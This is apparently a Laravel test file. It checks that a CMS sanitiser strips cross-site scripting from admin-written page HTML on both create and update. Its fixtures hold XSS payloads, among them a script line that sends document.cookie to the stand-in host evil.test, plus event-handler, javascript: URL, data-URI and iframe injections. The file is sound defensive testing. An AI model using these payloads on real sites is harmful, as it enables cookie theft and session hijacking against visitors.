<?php

use App\Domains\Identity\Models\User;
use App\Support\Html\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;

/**
 * Authored HTML reaches the public site raw.
 *
 * #280 closed the lesson-block path. The CMS path was never closed at all:
 * `PageController` validated `body` as `required|string` and
 * `public/page/show.blade.php` renders `{!! $page->body !!}`.
 *
 * The blast radius is wider than the block case on every axis. `admin/public-site`
 * is gated to `super_admin|admin|headmaster|supervisor` — a **broader** role
 * than the block path, which excluded supervisor — and the audience is
 * anonymous visitors rather than enrolled students.
 *
 * Sanitised on write rather than at each render, so the stored value is the safe
 * one and every reader of it is safe, instead of each of a dozen Blade views
 * having to remember.
 */
uses(RefreshDatabase::class);

function cmsClean(string $html): string
{
    return app(HtmlSanitizer::class)->clean($html, HtmlSanitizer::PROFILE_CMS);
}

it('keeps the richer markup a marketing page needs', function () {
    $clean = cmsClean(
        '<h1>Enrol now</h1><blockquote>A quote</blockquote>'
        .'<img src="https://cdn.test/a.png" alt="Campus">'
        .'<table><tr><td colspan="2">Fees</td></tr></table>'
    );

    // The lesson profile would have stripped all of these; a CMS page wants
    // them, which is why the profiles differ.
    expect($clean)->toContain('<h1>Enrol now</h1>')
        ->and($clean)->toContain('<blockquote>')
        ->and($clean)->toContain('alt="Campus"')
        ->and($clean)->toContain('colspan="2"');
});

it('strips script from a CMS body', function () {
    $clean = cmsClean('<p>Welcome</p><script>fetch("https://evil.test?c="+document.cookie)</script>');

    expect($clean)->toContain('Welcome')
        ->and($clean)->not->toContain('script')
        ->and($clean)->not->toContain('evil.test');
});

it('strips event handlers and javascript urls from a CMS body', function (string $payload, string $banned) {
    expect(strtolower(cmsClean($payload)))->not->toContain($banned);
})->with([
    'handler on a heading' => ['<h2 onmouseover="alert(1)">Fees</h2>', 'onmouseover'],
    'javascript href' => ['<a href="javascript:alert(1)">Apply</a>', 'javascript'],
    'javascript image source' => ['<img src="javascript:alert(1)">', 'javascript'],
    'onerror on an image' => ['<img src="https://cdn.test/a.png" onerror="alert(1)">', 'onerror'],
    'data uri image' => ['<img src="data:text/html;base64,PHNjcmlwdD4=">', 'data:'],
    'iframe' => ['<iframe src="https://evil.test"></iframe>', 'iframe'],
]);

it('sanitises a page body on the way in', function () {
    $admin = User::factory()->create();
    $admin->assignRole('super_admin');

    $this->withoutLocalizationMiddleware()->actingAs($admin)
        ->post(route('admin.pages.store'), [
            'title' => 'About the institute',
            'slug' => 'about-the-institute',
            'body' => '<p onclick="alert(1)">Our history</p><script>alert(1)</script>',
        ])->assertRedirect();

    $stored = (string) DB::table('pages')->where('slug', 'about-the-institute')->value('body');

    // The stored value is the safe one. Every render site is then safe by
    // construction, which is the point of doing it here.
    expect($stored)->toContain('Our history')
        ->and($stored)->not->toContain('onclick')
        ->and($stored)->not->toContain('script')
        ->and($stored)->not->toContain('alert(1)');
});

it('sanitises a page body on update too', function () {
    $admin = User::factory()->create();
    $admin->assignRole('super_admin');

    $id = DB::table('pages')->insertGetId([
        'title' => 'Fees', 'slug' => 'fees', 'body' => '<p>Old</p>',
        'is_published' => true, 'created_at' => now(), 'updated_at' => now(),
    ]);

    // Update is the path an attacker would actually use: the page already
    // exists and passes review, and the payload arrives later.
    $this->withoutLocalizationMiddleware()->actingAs($admin)
        ->put(route('admin.pages.update', $id), [
            'title' => 'Fees',
            'slug' => 'fees',
            'body' => '<p>New</p><a href="javascript:alert(1)">click</a>',
        ])->assertRedirect();

    $stored = (string) DB::table('pages')->where('id', $id)->value('body');

    expect($stored)->toContain('New')
        ->and($stored)->not->toContain('javascript');
});
